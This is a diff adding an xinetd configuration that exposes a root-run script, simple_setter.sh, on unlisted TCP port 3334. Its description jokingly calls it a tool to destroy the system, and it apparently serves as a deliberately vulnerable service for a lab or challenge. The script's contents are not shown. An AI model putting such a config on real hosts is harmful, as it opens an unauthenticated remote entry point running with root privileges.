@@ -1,0 +1,14 @@
+# default: on
+# description: Simple Bash-based tool to destroy your system
+service simple_setter
+{
+        flags           = REUSE
+        type            = UNLISTED
+        port            = 3334
+        socket_type     = stream
+        wait            = no
+        user            = root
+        server          = /usr/local/bin/simple_setter.sh
+        log_on_failure  += USERID
+        disable         = no
+}
